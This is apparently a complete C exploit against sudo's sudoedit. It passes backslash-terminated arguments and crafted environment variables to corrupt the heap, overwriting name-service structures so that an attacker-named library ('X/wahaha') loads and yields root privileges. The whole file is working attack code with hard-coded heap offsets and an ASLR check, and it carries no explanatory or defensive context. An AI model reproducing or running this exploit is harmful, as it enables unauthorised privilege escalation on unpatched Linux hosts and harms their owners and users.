
#include <unistd.h>
#include <string.h>
#include <assert.h>
#include <stdio.h>
#include <stdint.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define SUDO_PATH "/usr/local/bin/sudoedit"
#define NULL_B "\\"
#define NULL_7 "\\","\\","\\","\\","\\","\\","\\"
#define NULL_Q "\\","\\","\\","\\","\\","\\","\\","\\"
#define CONST_CHR(c) c ## "\\","\\","\\","\\","\\","\\","\\"

#define BUF_VAR(sz) (buf_##sz)
#define DECLARE_BUF(sz, val) \
        char BUF_VAR(sz)[sz] = {0}; \
        memset(BUF_VAR(sz), val, sizeof(BUF_VAR(sz)) - 2); \
        BUF_VAR(sz)[sizeof(BUF_VAR(sz))-2] = '\\'; \
        BUF_VAR(sz)[sizeof(BUF_VAR(sz))-1] = 0;


#define FILL_PADD(sz, s) \
        strncpy(BUF_VAR(sz), s, (sizeof(BUF_VAR(sz))-3)); \
        BUF_VAR(sz)[sizeof(BUF_VAR(sz))-2] = '\\'; \
        BUF_VAR(sz)[sizeof(BUF_VAR(sz))-1] = 0;


#define UINT64_VAR(name) (u64_##name)
#define DECLARE_UINT64(name, val) \
        uint64_t UINT64_VAR(name) = val;\
        ((char*)(&UINT64_VAR(name)))[6] = '\\';

#define HEAPBASE_ASLR_OFF (0x555555777000) 
#define HEAPBASE (0x55729c040000)


uint64_t g_heap_base = HEAPBASE;
#define HEAP_OFFSET(a) (a + g_heap_base)

int main()
{

        DECLARE_BUF(0x81, 0x41);
        DECLARE_BUF(0xa1, 0x42);
        DECLARE_BUF(0xd1, 0x43);
        DECLARE_BUF(0x59, 0x44);

        char locale[238] = {0};
        strcpy(locale, "LC_ALL=C.UTF-8@");
        memset(locale+strlen(locale), 0x61, sizeof(locale)-1-strlen(locale));

        int fd = 0;
        char aslr_level = 0;

        if ((fd = open("/proc/sys/kernel/randomize_va_space", O_RDONLY))) {
                read(fd, &aslr_level, 1);
                
                aslr_level -= '0';
                if (!aslr_level) {
                        g_heap_base = HEAPBASE_ASLR_OFF;
                }
        }

        char *argv[] = {
                SUDO_PATH, 
                "-Ans",
                BUF_VAR(0x81), // smallbin size
                NULL
        };

        
        DECLARE_UINT64(name_database_entry_ptr, HEAP_OFFSET(0xa710)); 
        DECLARE_UINT64(service_user_ptr, HEAP_OFFSET(0xa730)); 
        char *envp[] = {
                "\x90" NULL_7,
                "\x21" NULL_7,
                BUF_VAR(0xa1),
                NULL_Q, // next
                NULL_Q, 
                BUF_VAR(0xd1),
                (char*)(&UINT64_VAR(name_database_entry_ptr)), NULL_B,
                BUF_VAR(0x59),
                // name_database_entry layout
                NULL_Q,                                         // next
                (char*)(&UINT64_VAR(service_user_ptr)), NULL_B, // service
                "group" NULL_B, NULL_B, NULL_B,                 // name
                NULL_Q, //"\x41" NULL_7,
                // service_user layout
                NULL_Q, // next
                NULL_Q, // action[0..1]
                NULL_Q, // action[2..3]
                NULL_Q, // action[4]
                NULL_Q,   // library
                NULL_Q,   // known
                "X/wahaha", // name
                "SUDO_ASKPASS=/bin/false",
                locale,
                NULL
        };

        execve(SUDO_PATH, argv, envp);
        return 0;
}
